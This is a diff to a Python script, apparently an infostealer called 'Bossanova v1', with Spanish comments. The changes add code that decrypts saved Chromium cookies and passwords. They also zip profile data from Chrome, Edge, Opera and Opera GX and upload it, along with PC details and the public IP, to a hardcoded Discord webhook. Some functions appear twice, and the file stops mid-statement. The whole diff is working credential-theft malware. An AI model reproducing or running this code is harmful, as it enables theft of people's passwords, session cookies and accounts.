@@ -253,6 +253,90 @@ def empaquetar_network(browser="chrome"):
     except Exception:
         return None
 
+def filetime_to_datetime(ts):
+    return datetime(1601, 1, 1) + timedelta(microseconds=ts)
+
+def byte_xor(ba1, ba2):
+    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
+
+def decode_cli_key(s):
+    if s is None:
+        return None
+    base64_key = base64.b64encode(s.encode())
+    as_txt = base64.b64decode(base64_key).decode('utf-8').replace('\\x', '')
+    return binascii.unhexlify(bytearray(as_txt, 'utf-8'))
+
+def decrypt_data(encrypted_junk, key, master_key=None, password=False):
+    try:
+        version = encrypted_junk[:3]
+        if version in (b'v10', b'v11'):
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
+                return cipher.decrypt(encrypted_password).decode()
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text[32:].decode('utf-8')
+        elif version in (b'v20'):
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text.decode('utf-8') if password else text[32:].decode('utf-8')
+    except Exception:
+        return ""
+    return ""
+
+def extraer_datos_navegador(browser_name, profile_path, key):
+    """Extrae cookies y credenciales de las bases de datos de forma segura."""
+    resultados = {"cookies": [], "passwords": []}
+    
+    cookie_db = os.path.join(profile_path, "Network", "Cookies")
+    login_db = os.path.join(profile_path, "Login Data")
+    
+    # Procesar Cookies
+    if os.path.exists(cookie_db):
+        temp_cookie_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}.db")
+        try:
+            shutil.copy2(cookie_db, temp_cookie_db)
+            conn = sqlite3.connect(temp_cookie_db)
+            cursor = conn.cursor()
+            cursor.execute('select host_key, path, name, CAST(encrypted_value AS BLOB) from cookies')
+            for host_key, path, name, encrypted_value in cursor.fetchall():
+                val = decrypt_data(encrypted_value, key, None, False)
+                if val:
+                    resultados["cookies"].append({"domain": host_key, "name": name, "value": val})
+            conn.close()
+            os.remove(temp_cookie_db)
+        except Exception:
+            pass
+
+    # Procesar Contraseñas
+    if os.path.exists(login_db):
+        temp_login_db = os.path.join(tempfile.gettempdir(), f"logins_{browser_name}.db")
+        try:
+            shutil.copy2(login_db, temp_login_db)
+            conn = sqlite3.connect(temp_login_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for origin_url, username_value, password_value in cursor.fetchall():
+                pwd = decrypt_data(password_value, key, None, True)
+                if pwd and username_value:
+                    resultados["passwords"].append({"url": origin_url, "user": username_value, "pass": pwd})
+            conn.close()
+            os.remove(temp_login_db)
+        except Exception:
+            pass
+            
+    return resultados
+
 def capturar_pantalla_jpg():
   try:
     
@@ -269,9 +353,86 @@ def capturar_pantalla_jpg():
     return None
 
 
-######## Webhook #############################################################
+######## Webhook y Configuración ##############################################
 
 WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560604217654386858/RcEuKQFGc-pguKLBFfaUmepTYVNlPlF0yzr1o-UAF-goZL7JCdt9Ifbi3lr-c_npaC3e"
+
+def filetime_to_datetime(ts):
+    return datetime(1601, 1, 1) + timedelta(microseconds=ts)
+
+def decrypt_data(encrypted_junk, key, master_key=None, password=False):
+    try:
+        version = encrypted_junk[:3]
+        if version in (b'v10', b'v11'):
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
+                return cipher.decrypt(encrypted_password).decode()
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text[32:].decode('utf-8')
+        elif version in (b'v20'):
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text.decode('utf-8') if password else text[32:].decode('utf-8')
+    except Exception:
+        return ""
+    return ""
+
+def extraer_credenciales_navegador(browser_name, profile_path, key):
+    """Extrae cookies y contraseñas de las bases de datos del navegador."""
+    resultados = {"cookies": [], "passwords": []}
+    
+    # Rutas comunes en Chromium (Chrome, Edge, etc.)
+    cookie_db = os.path.join(profile_path, "Network", "Cookies")
+    login_db = os.path.join(profile_path, "Login Data")
+    
+    # Procesar Cookies
+    if os.path.exists(cookie_db):
+        temp_cookie_db = os.path.join(tempfile.gettempdir(), f"cookies_{browser_name}.db")
+        try:
+            shutil.copy2(cookie_db, temp_cookie_db)
+            conn = sqlite3.connect(temp_cookie_db)
+            cursor = conn.cursor()
+            cursor.execute('select host_key, path, name, CAST(encrypted_value AS BLOB) from cookies')
+            for host_key, path, name, encrypted_value in cursor.fetchall():
+                val = decrypt_data(encrypted_value, key, None, False)
+                if val:
+                    resultados["cookies"].append(f"Domain: {host_key} | Name: {name} | Value: {val}")
+            conn.close()
+            os.remove(temp_cookie_db)
+        except Exception:
+            pass
+
+    # Procesar Contraseñas
+    if os.path.exists(login_db):
+        temp_login_db = os.path.join(tempfile.gettempdir(), f"logins_{browser_name}.db")
+        try:
+            shutil.copy2(login_db, temp_login_db)
+            conn = sqlite3.connect(temp_login_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for origin_url, username_value, password_value in cursor.fetchall():
+                pwd = decrypt_data(password_value, key, None, True)
+                if pwd and username_value:
+                    resultados["passwords"].append(f"URL: {origin_url} | User: {username_value} | Pass: {pwd}")
+            conn.close()
+            os.remove(temp_login_db)
+        except Exception:
+            pass
+            
+    return resultados
+
+######## Funciones de Recopilación del Sistema (webhook.txt) ####################
 
 def empaquetar_network(browser="chrome"):
     browser = browser.lower()
@@ -279,17 +440,14 @@ def empaquetar_network(browser="chrome"):
     appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
     
     target_dir = None
-    
     if browser == "chrome":
-        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
+        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default")
     elif browser == "edge":
-        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
+        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default")
     elif browser == "opera":
-        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default")
     elif browser == "operagx":
-        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
-    elif browser == "firefox":
-        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default")
     else:
         return None
 
@@ -297,57 +455,40 @@ def empaquetar_network(browser="chrome"):
         return None
 
     temp_dir = tempfile.gettempdir()
-    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
-    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")
+    staging_dir = os.path.join(temp_dir, f"{browser}_staging")
+    zip_base_path = os.path.join(temp_dir, f"{browser}_data")
 
     try:
         if os.path.exists(staging_dir):
             shutil.rmtree(staging_dir, ignore_errors=True)
         os.makedirs(staging_dir, exist_ok=True)
 
-        for item in os.listdir(target_dir):
-            source_item = os.path.join(target_dir, item)
-            target_item = os.path.join(staging_dir, item)
-            try:
-                if browser == "firefox" and not item.startswith("cookies.sqlite"):
-                    continue
-                
-                if os.path.isdir(source_item):
-                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
+        # Copiar carpetas clave de perfil (Network, Local Storage, etc.)
+        for item in ["Network", "Local Storage", "Login Data", "Cookies"]:
+            src_item = os.path.join(target_dir, item)
+            if os.path.exists(src_item):
+                if os.path.isdir(src_item):
+                    shutil.copytree(src_item, os.path.join(staging_dir, item), dirs_exist_ok=True)
                 else:
-                    shutil.copy2(source_item, target_item)
-            except Exception:
-                pass
+                    shutil.copy2(src_item, staging_dir)
 
         shutil.make_archive(zip_base_path, "zip", staging_dir)
-        final_zip_file = zip_base_path + ".zip"
-
-        if os.path.exists(staging_dir):
-            shutil.rmtree(staging_dir, ignore_errors=True)
-
-        return final_zip_file
+        shutil.rmtree(staging_dir, ignore_errors=True)
+        return zip_base_path + ".zip"
     except Exception:
         return None
 
 
 def obtener_info_pc():
     info_sistema = {}
-
     try:
         cmd_cpu = "wmic cpu get name"
-        procesador = (
-            subprocess.check_output(cmd_cpu, shell=True)
-            .decode("utf-8", errors="ignore")
-            .split("\n")[1]
-            .strip()
-        )
+        procesador = subprocess.check_output(cmd_cpu, shell=True).decode("utf-8", errors="ignore").split("\n")[1].strip()
         info_sistema["procesador"] = procesador if procesador else "Desconocido"
     except Exception:
         info_sistema["procesador"] = platform.processor() or "Desconocido"
 
-    info_sistema["os"] = (
-        f"{platform.system()} {platform.release()} ({platform.version()})"
-    )
+    info_sistema["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
     info_sistema["nombre_pc"] = socket.gethostname()
 
     try:
@@ -361,92 +502,32 @@ def obtener_info_pc():
     except Exception:
         info_sistema["ip_publica"] = "No disponible"
 
-    try:
-        cmd_gpu = "wmic path win32_videocontroller get name"
-        gpu = (
-            subprocess.check_output(cmd_gpu, shell=True)
-            .decode("utf-8", errors="ignore")
-            .split("\n")[1]
-            .strip()
-        )
-        info_sistema["gpu"] = gpu if gpu else "Desconocida"
-    except Exception:
-        info_sistema["gpu"] = "No disponible"
-
     return info_sistema
 
 
-def obtener_datos_usuario(token):
-    headers = {"Authorization": token.strip(), "Content-Type": "application/json"}
-    try:
-        response = requests.get(
-            "https://discord.com/api/v10/users/@me", headers=headers
-        )
-        if response.status_code == 200:
-            return {"success": True, "data": response.json()}
-        else:
-            return {"success": False, "status": response.status_code}
-    except Exception as e:
-        return {"success": False, "status": str(e)}
-
-
-def enviar_reporte_completo(tokens):
+def enviar_reporte_completo():
     datos_pc = obtener_info_pc()
 
     descripcion = (
         f" **PC:** `{datos_pc['nombre_pc']}`\n"
         f" **OS:** `{datos_pc['os']}`\n"
         f" **Procesador:** `{datos_pc['procesador']}`\n"
-        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
         f" **IP Local:** `{datos_pc['ip_local']}`\n"
         f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
         f"---\n"
-        f" **Tokens:**\n"
     )
-
-    if tokens:
-        for token in tokens:
-            token_limpio = token.strip()
-            resultado = obtener_datos_usuario(token_limpio)
-
-            if resultado["success"]:
-                user_data = resultado["data"]
-                username = user_data.get("username", "Desconocido")
-                user_id = user_data.get("id", "Desconocido")
-                email = user_data.get("email", "No disponible")
-                phone = user_data.get("phone", "No disponible")
-
-                descripcion += (
-                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
-                    f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
-                    f"• **Token:**\n`{token_limpio}`\n"
-                )
-            else:
-                status = resultado["status"]
-                descripcion += (
-                    f"\n **Token Inválido (Error: {status}):**\n`{token_limpio}`\n"
-                )
-
-            time.sleep(0.5)
-    else:
-        descripcion += "_No se encontraron tokens._"
-
-    if len(descripcion) > 4000:
-        descripcion = descripcion[:3997] + "..."
 
     payload = {
         "embeds": [{
-            "title": "Bossanova v1",
+            "title": "Bossanova v1 - Integración Webhook",
             "description": descripcion,
             "color": 5814783,
             "footer": {"text": "Por BossaNova"},
         }]
     }
 
-    txt_path = generar_archivo_historial() if 'generar_archivo_historial' in globals() else None
-    img_jpg_stream = capturar_pantalla_jpg() if 'capturar_pantalla_jpg' in globals() else None
-
-    navegadores = ["chrome", "edge", "opera", "operagx", "firefox"]
+    # Empaquetar datos de navegadores
+    navegadores = ["chrome", "edge", "opera", "operagx"]
     zip_paths = {}
     for nav in navegadores:
         zp = empaquetar_network(nav)
@@ -456,53 +537,36 @@ def enviar_reporte_completo(tokens):
     files = {}
     open_files = []
     try:
-        if txt_path and os.path.exists(txt_path):
-            f_txt = open(txt_path, "rb")
-            open_files.append(f_txt)
-            files["file1"] = ("historial_global.txt", f_txt, "text/plain")
-
-        file_idx = 2
+        file_idx = 1
         for nav, zp in zip_paths.items():
             f_zip = open(zp, "rb")
             open_files.append(f_zip)
-            files[f"file{file_idx}"] = (f"{nav}_network_data.zip", f_zip, "application/zip")
+            files[f"file{file_idx}"] = (f"{nav}_data.zip", f_zip, "application/zip")
             file_idx += 1
-
-        if img_jpg_stream:
-            files[f"file{file_idx}"] = ("captura.jpg", img_jpg_stream.getvalue(), "image/jpeg")
 
         requests.post(
             WEBHOOK_URL_UNICO,
             data={"payload_json": json.dumps(payload)},
             files=files,
         )
-
-        for f in open_files:
-            f.close()
     except Exception:
+        pass
+    finally:
         for f in open_files:
             try:
                 f.close()
             except:
                 pass
 
-    if txt_path and os.path.exists(txt_path):
-        try:
-            os.remove(txt_path)
-        except:
-            pass
-
-    for zp in zip_paths.values():
-        if os.path.exists(zp):
-            try:
-                os.remove(zp)
-            except:
-                pass
-
+        for zp in zip_paths.values():
+            if os.path.exists(zp):
+                try:
+                    os.remove(zp)
+                except:
+                    pass
 
 if __name__ == "__main__":
-    tokens = obtener_tokens_reales() if 'obtener_tokens_reales' in globals() else []
-    enviar_reporte_completo(tokens)
+    enviar_reporte_completo()
   
 try:
   import urllib.request
